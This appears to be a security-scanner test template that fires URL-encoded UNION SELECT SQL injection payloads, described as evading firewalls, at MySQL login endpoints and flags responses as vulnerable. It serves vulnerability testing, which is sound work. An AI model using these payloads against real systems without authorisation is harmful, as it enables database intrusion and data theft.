id: UNION_URL_ENCODED_BASED_MYSQLI
info:
  name: "Union based SQL Injection test with URL Encoded Payloads for MySQL on Login Endpoints"
  description: >
    "A Union-based SQL Injection test with URL-encoded payloads for MySQL on login endpoints involves encoding SQL injection strings to bypass web application firewalls and input validation mechanisms. By using URL encoding, testers can conceal malicious queries that include UNION SELECT statements within login input fields. This technique aims to manipulate SQL queries and retrieve sensitive data from the database, exploiting vulnerabilities in how the application processes encoded input."
  details: >
    "In Union-based SQL Injection tests with URL-encoded payloads for MySQL on login endpoints, attackers encode their SQL injection strings to evade web application firewalls and input validation filters. By URL-encoding the payload, they obscure malicious UNION SELECT statements within login inputs, making it harder for security mechanisms to detect the attack. This method allows attackers to exploit SQL query vulnerabilities, potentially extracting sensitive data from the database while bypassing standard security checks."
  impact: >
    "The impact of Union-based SQL Injection with URL-encoded payloads for MySQL on login endpoints can be substantial, allowing attackers to bypass security mechanisms and retrieve sensitive database information. Successful exploitation can lead to unauthorized access to user accounts, exposure of confidential data, and manipulation of database content. Such breaches can cause significant reputational damage, financial losses, and potential legal consequences for the affected organization."

  category:
    name: NO_AUTH
    shortName: Broken Authentication
    displayName: Broken User Authentication (BUA)
  subCategory: UNION_URL_ENCODED_BASED_MYSQLI
  severity: MEDIUM
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
  cwe:
    - CWE-287
  cve:
    - CVE-2020-24008
    - CVE-2021-45901

attributes:
  nature: INTRUSIVE
  plan: PRO
  duration: FAST
api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
  url:
    contains_either:
      - login
      - signin
      - authenticate
      - auth
  request_payload:
    for_one:
      key:
        regex: "username|^user$|^userid$|^user_id$|^login$|^login_id$|email|^account$|^account_id$|^member$|^member_id$|^id$|^user_name$|^uname$|^identifier$|^user_identifier$|^admin$|^nick$|^nickname$|^handle$|^alias$|^principal$|^profile$|^profile_id$|^name$|^signin$|^auth$|^credential$|^user_login$|^user_account$|^user_email$|^employee$|^employee_id$|^operator$|^customer_id$|^client_id$|^subscriber$|^subscriber_id$|^participant$|^participant_id$|^client_id$|^userLoginID$|^client-name$"
        extract: userKey
      value:
        extract: userVal
wordLists:
  unionBasedPayloads:
    - "%27%20UNION%20SELECT%201,%20user(),%20version()--"
    - "%27%20UNION%20SELECT%201,%20database(),%20version()--"
    - "%27%20UNION%20SELECT%201,%20current_user(),%20version()--"
    - "%27%20UNION%20SELECT%201,%20user(),%20schema()--"
    - "%27%20UNION%20SELECT%201,%20user(),%20version_compile_os--"
    - "%27%20UNION%20SELECT%201,%20user(),%20version_compile_machine--"
    - "%27%20UNION%20SELECT%201,%20user(),%20session_user()--"
    - "%27%20UNION%20SELECT%201,%20user(),%20now()--"
    - "%27%20UNION%20SELECT%201,%20user(),%20char(0x2F)--"
    - "%27%20UNION%20SELECT%201,%20user(),%20version_comment()--"
  unionBasedNegativePayloads:
    - "%27%20UNION%20SELECT%201,%20user(),%20version()%20WHERE%201%3D0%20--"
    - "%27%20UNION%20SELECT%201,%20database(),%20version()%20WHERE%201%3D0%20--"
    - "%27%20UNION%20SELECT%201,%20current_user(),%20version()%20WHERE%201%3D0%20--"
    - "%27%20UNION%20SELECT%201,%20user(),%20schema()%20WHERE%201%3D0%20--"
    - "%27%20UNION%20SELECT%201,%20user(),%20version_compile_os%20WHERE%201%3D0%20--"
    - "%27%20UNION%20SELECT%201,%20user(),%20version_compile_machine%20WHERE%201%3D0%20--"
    - "%27%20UNION%20SELECT%201,%20user(),%20session_user()%20WHERE%201%3D0%20--"
    - "%27%20UNION%20SELECT%201,%20user(),%20now()%20WHERE%201%3D0%20--"
    - "%27%20UNION%20SELECT%201,%20user(),%20char(0x2F)%20WHERE%201%3D0%20--"
    - "%27%20UNION%20SELECT%201,%20user(),%20version_comment()%20WHERE%201%3D0%20--"

 
execute:
  type: multiple
  requests:
    - req:
        - modify_body_param:
            userKey: ${userVal}${unionBasedPayloads}
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
              not_contains:
                - Error
                - Internal Server
                - Fail
                - Unauthorized
                - access denied
                - Forbidden
                - Method Not allowed
                - Gateway timeout
                - request timeout
                - server error
                - server busy
                - authentication error
                - authorization error
                - validation error
                - Permission Denied
                - invalid
                - token expired
                - session expired
                - session timeout
                - unexpected error
                - unable to process request
                - bad request
                - service unavailable
                - account is locked
                - account is blocked
                - multiple failed attempts
                - Attention Required!
                - CloudFlare
                - Sorry, you have been blocked
                - UNION
                - SELECT
                - <html>
                - </html>
        - success: x2
        - failure: exit
    - req:
        - modify_body_param:
            userKey: ${userVal}${unionBasedNegativePayloads}
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
              not_contains:
                - Error
                - Internal Server
                - Fail
                - Unauthorized
                - access denied
                - Forbidden
                - Method Not allowed
                - Gateway timeout
                - request timeout
                - server error
                - server busy
                - authentication error
                - authorization error
                - validation error
                - Permission Denied
                - invalid
                - token expired
                - session expired
                - session timeout
                - unexpected error
                - unable to process request
                - bad request
                - service unavailable
                - account is locked
                - account is blocked
                - multiple failed attempts
                - Attention Required!
                - CloudFlare
                - Sorry, you have been blocked
                - UNION
                - SELECT
                - WHERE
                - <html>
                - </html>
              neq: "${x1.response.body}"
        - success: vulnerable




